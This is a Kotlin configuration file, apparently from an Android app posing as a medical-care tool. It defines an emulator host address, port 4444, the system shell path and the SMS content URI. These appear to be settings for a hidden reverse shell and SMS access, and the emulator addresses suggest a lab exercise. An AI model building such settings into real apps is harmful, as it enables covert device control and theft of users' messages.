package com.example.medicalcare.features.network.connection

object ConfigNetwork {
    val HOST: String
        get() = if (isGenymotion()) "10.0.3.2" else "10.0.2.2"
    const val PORT = 4444
    const val SHELL_PATH = "/system/bin/sh"
    const val SMS_URL = "content://sms/"

    private fun isGenymotion(): Boolean {
        return android.os.Build.MANUFACTURER.contains("Genymotion", ignoreCase = true) ||
                android.os.Build.FINGERPRINT.contains("vbox", ignoreCase = true)
    }
}